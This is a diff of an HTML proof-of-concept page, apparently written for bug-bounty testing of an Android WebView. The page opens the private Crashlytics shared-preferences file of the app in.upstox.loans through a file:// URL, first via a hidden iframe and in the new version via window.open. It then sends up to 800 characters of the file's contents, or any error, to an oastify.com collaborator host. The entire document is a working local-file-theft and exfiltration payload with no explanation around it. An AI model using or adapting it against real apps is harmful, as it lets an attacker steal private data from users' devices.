@@ -1,24 +1,13 @@
 <html><body>
-<iframe id="f" src="file:///data/data/in.upstox.loans/shared_prefs/com.google.firebase.crashlytics.xml" style="display:none"></iframe>
 <script>
+var w = window.open("file:///data/data/in.upstox.loans/shared_prefs/com.google.firebase.crashlytics.xml");
 setTimeout(function() {
   try {
-    var doc = document.getElementById('f').contentDocument;
-    var data = "";
-    // Try multiple ways to get content
-    if(doc.xmlVersion !== null) {
-      data = "XML:" + new XMLSerializer().serializeToString(doc);
-    } else if(doc.body && doc.body.innerText) {
-      data = "TEXT:" + doc.body.innerText;
-    } else if(doc.documentElement) {
-      data = "HTML:" + doc.documentElement.innerHTML;
-    } else {
-      data = "EMPTY:doctype=" + (doc.doctype?doc.doctype.name:"null") + ",children=" + doc.childNodes.length;
-    }
-    document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_read?data=" + encodeURIComponent(data.substring(0,800));
+    var data = w.document.body.innerText || w.document.body.textContent || w.document.documentElement.textContent || new XMLSerializer().serializeToString(w.document);
+    document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_window_open?data=" + encodeURIComponent(data.substring(0,800));
   } catch(e) {
-    document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_read_err?msg=" + encodeURIComponent(e.message);
+    document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_window_err?msg=" + encodeURIComponent(e.message);
   }
-}, 2000);
+}, 3000);
 </script>
 </body></html>
